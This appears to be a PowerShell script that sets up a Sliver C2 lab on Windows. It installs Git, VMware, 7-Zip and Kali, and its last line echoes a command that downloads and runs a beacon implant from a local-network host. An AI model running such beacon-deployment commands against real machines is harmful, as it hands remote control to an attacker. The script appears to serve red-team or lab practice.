# run in administrator powershell prompt with Set-ExecutionPolicy RemoteSigned && ./sliverWindowsStarter.ps1
Invoke-WebRequest -Uri "https://github.com/git-for-windows/git/releases/download/v2.40.0.windows.1/Git-2.40.0-64-bit.exe" -OutFile "$home\downloads/gitinstall.exe" -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
.\$home\downloads\gitinstall.exe

Invoke-WebRequest -Uri "https://www.vmware.com/go/getplayer-win" -OutFile "$home\downloads/vmwareinstall.exe" -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
.\$home\downloads\vmwareinstall.exe

Invoke-WebRequest -Uri "https://cdimage.kali.org/kali-2023.1/kali-linux-2023.1-vmware-amd64.7z" -OutFile "$home\downloads/kali.7z" -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"

Invoke-WebRequest -Uri "https://www.7-zip.org/a/7z2201-x64.exe" -OutFile "$home\downloads/7zipinstall.exe" -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
.\$home\downloads\7zipinstall.exe

cd $home/desktop
git clone https://github.com/jacobvanderwyst/bashscripts.git
cd ..
echo "run to download beacon iwr http://192.168.242.130:8000/ELEGANT_DIAPHRAGM.exe -o ~/desktop/elegant_diaphram.exe && ~/desktop/elegant_diaphram.exe"
Set-ExecutionPolicy Restricted